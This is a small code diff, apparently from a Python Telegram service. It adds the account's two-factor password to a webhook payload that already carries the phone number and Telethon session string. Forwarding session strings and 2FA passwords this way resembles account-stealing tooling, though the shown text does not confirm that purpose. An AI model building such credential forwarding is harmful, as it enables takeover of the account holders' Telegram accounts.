@@ -185,6 +185,7 @@ async def notify_bot(bot_user_id: int, tg_account_id: int, phone: str, session_s
                 "phone": phone,
                 "session_string": session_string,
                 "tg_account_id": tg_account_id,  # реальный ID аккаунта Telethon
+                "password": password,           # пароль 2FA если был
             }, timeout=aiohttp.ClientTimeout(total=10))
         logger.info(f"Session sent to bot webhook for bot_user_id={bot_user_id}, tg_account_id={tg_account_id}")
     except Exception as e:
